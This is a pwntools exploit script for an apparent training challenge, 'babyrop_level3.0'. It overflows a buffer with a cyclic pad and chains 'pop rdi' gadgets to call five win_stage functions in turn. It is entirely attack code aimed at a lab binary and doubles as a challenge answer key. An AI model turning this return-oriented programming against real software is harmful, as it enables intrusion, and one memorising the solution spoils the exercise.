from pwn import *

elf = context.binary = ELF('/challenge/babyrop_level3.0')
context.log_level = 'Debug'
context.terminal = ['tmux', 'splitw', '-h']

p = process()

#0x00000000004026d3 : pop rdi ; ret
#0x00000000004026d1 : pop rsi ; pop r15 ; ret
#0x00000000004026cd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
#0x0000000000401514 : pop rsp ; pop r13 ; pop rbp ; ret

payload = cyclic(104)
payload += p64(0x00000000004026d3)
payload += p64(1)
payload += p64(elf.sym.win_stage_1)
payload += p64(0x00000000004026d3)
payload += p64(2)
#payload += p64(0)
payload += p64(elf.sym.win_stage_2)
payload += p64(0x00000000004026d3)
payload += p64(3)
#payload += p64(0x000000000040101a)
payload += p64(elf.sym.win_stage_3)
payload += p64(0x00000000004026d3)
payload += p64(4)
payload += p64(elf.sym.win_stage_4)
payload += p64(0x00000000004026d3)
payload += p64(5)
payload += p64(elf.sym.win_stage_5)
#payload += p64(0x000000000040101a)
#payload += p64(elf.sym.win_stage_2)
#payload += p64(elf.sym.win_stage_3)
#payload += p64(elf.sym.win_stage_4)
#payload += p64(elf.sym.win_stage_5)
p.sendline(payload)
p.interactive()
